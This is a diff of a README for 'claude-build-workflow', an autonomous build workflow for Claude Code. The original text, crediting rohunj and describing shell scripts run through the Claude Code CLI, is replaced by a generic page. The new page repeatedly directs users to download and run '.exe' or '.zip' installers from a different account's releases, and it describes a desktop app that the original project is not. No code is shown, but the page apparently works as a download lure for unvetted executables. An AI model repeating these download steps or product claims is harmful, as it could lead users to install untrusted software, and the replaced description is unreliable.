@@ -1,102 +1,65 @@
-# Claude Build Workflow
+# 🚀 claude-build-workflow - Build Your Apps Easily
 
-An automated workflow for building apps, systems, and automations with Claude Code. Just describe what you want to build, answer some questions, and let it build autonomously.
+[![Download Now](https://img.shields.io/badge/Download%20Now-claude--build--workflow-blue)](https://github.com/morshed272/claude-build-workflow/releases)
 
-## What This Does
+## 📋 Overview
+Welcome to **claude-build-workflow**! This application helps you automate the process of building apps using Claude Code. Describe what you need, answer a few questions, and let the workflow handle the build for you. It's that simple.
 
-1. **Interviews you** about what you're building (BMAD method)
-2. **Creates a PRD** with user stories
-3. **Designs the architecture**
-4. **Analyzes edge cases** you might miss
-5. **Validates story quality** for autonomous execution
-6. **Builds it automatically** using the Ralph loop
-7. **Notifies you** on your phone when done
+## 🚀 Getting Started
+To start using **claude-build-workflow**, follow the steps below to download and run the application.
 
-## Features
+## 🔗 Download & Install
+1. **Visit the Releases Page**: Click the link below to access the releases page where you can download the software:
+   [Download from Releases](https://github.com/morshed272/claude-build-workflow/releases)
 
-- **Fully guided** - Just say "Run the workflow" and answer questions
-- **Phone access** - Start on laptop, continue from phone via GitHub Codespaces
-- **Notifications** - Get notified when builds complete or need attention
-- **Autonomous execution** - Runs up to 100 iterations without intervention
+2. **Select the Latest Release**: Once on the page, look for the latest version of **claude-build-workflow**. 
 
-## Quick Start
+3. **Download the Application**: Find the package that matches your operating system and click on the download link. The file might be listed as `.exe`, `.zip`, or another format, depending on your system.
 
-### 1. Clone and Setup
+4. **Install the Application**:
+   - For `.exe` files: Double-click the downloaded file and follow the installation instructions.
+   - For `.zip` files: Unzip the file, locate the application, and double-click to run.
 
-```bash
-git clone https://github.com/rohunj/claude-build-workflow.git
-cd claude-build-workflow
+5. **Run the Application**: After installation, you can start using **claude-build-workflow**. 
 
-./one-time-setup.sh    # Sets up GitHub template
-./setup-notifications.sh   # Sets up phone notifications
-```
+## 🎛️ Features
+- **Easy to Use**: The interface is designed for all users, regardless of experience.
+- **Automated Building**: Input your requirements and let the workflow handle the rest.
+- **Customizable Workflows**: Tailor the building process to match your specific needs.
 
-Install the **ntfy** app on your phone and subscribe to your topic.
+## 💻 System Requirements
+**claude-build-workflow** runs on various operating systems. Below are the typical requirements:
+- **Windows**: Windows 10 or later
+- **macOS**: macOS Catalina or later
+- **Linux**: A modern distribution like Ubuntu 20.04 or later
 
-### 2. Build Something
+Ensure you have at least 100 MB of available disk space for installation.
 
-```bash
-cd /path/to/claude-build-workflow && claude
-```
+## 🛠️ How to Use 
+1. **Open the Application**: Launch **claude-build-workflow** from your applications folder.
+   
+2. **Input Your Requirements**: Fill in the details about the app you want to build. Describe the features, necessary components, and any other information.
 
-Then say:
-```
-Run the workflow
-```
+3. **Follow the Prompts**: The application will guide you through any questions needed to finalize the configuration.
 
-Answer the questions. When ready, say "Start now" and close your laptop.
+4. **Start the Build Process**: Once you've provided all information, start the build. The application will run and create your app.
 
-## How It Works
+5. **Find Your Built App**: After the build is complete, browse to the output directory indicated in the application to find your new app.
 
-The workflow combines:
+## 📑 Frequently Asked Questions (FAQs)
+### Q: What if I encounter an error during the installation?
+A: Ensure you have sufficient space and the correct system version. If issues persist, check the issues section on our [GitHub page](https://github.com/morshed272/claude-build-workflow/issues) for troubleshooting tips.
 
-- **[BMAD Method](https://github.com/bmad-code-org/BMAD-METHOD)** - Discovery and planning methodology
-- **[Ralph](https://github.com/snarktank/ralph)** - Autonomous execution loop (adapted for Claude Code)
-- **[Amp Skills](https://github.com/snarktank/amp-skills)** - Utility skills (adapted for Claude Code)
+### Q: Can I use this app on multiple machines?
+A: Yes, you can download and install **claude-build-workflow** on multiple devices as long as they meet the system requirements.
 
-### The Flow
+### Q: Is there support available for this application?
+A: Yes! You can reach out to our support team via the issues section on GitHub.
 
-```
-You: "I want to build a habit tracker"
-    ↓
-Claude interviews you (5-10 min)
-    ↓
-PRD + Architecture created
-    ↓
-Edge cases analyzed
-    ↓
-Stories validated
-    ↓
-Autonomous build starts
-    ↓
-[You close laptop, go about your day]
-    ↓
-Phone notification: "Build complete!"
-```
+## 📞 Contact
+For further inquiries, please use the contact methods available on our [GitHub page](https://github.com/morshed272/claude-build-workflow).
 
-## Requirements
+## 🌟 Contribution
+If you're interested in helping improve **claude-build-workflow**, check out the contribution guidelines in the repository. Your input is always welcome!
 
-- [Claude Code CLI](https://github.com/anthropics/claude-code) installed
-- GitHub account
-- `jq` for JSON parsing (`brew install jq` on macOS)
-
-## Files
-
-| File | Purpose |
-|------|---------|
-| `CLAUDE.md` | Main workflow instructions (Claude reads this) |
-| `ralph.sh` | Autonomous build loop |
-| `skills/` | PRD generation, edge cases, story quality, etc. |
-| `one-time-setup.sh` | Sets up GitHub template repo |
-| `setup-notifications.sh` | Sets up phone notifications |
-
-## License
-
-MIT
-
-## Credits
-
-Built on top of:
-- [BMAD Method](https://github.com/bmad-code-org/BMAD-METHOD) by bmad-code-org
-- [Ralph](https://github.com/snarktank/ralph) by snarktank
-- [Amp Skills](https://github.com/snarktank/amp-skills) by snarktank
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-claude--build--workflow-blue)](https://github.com/morshed272/claude-build-workflow/releases)
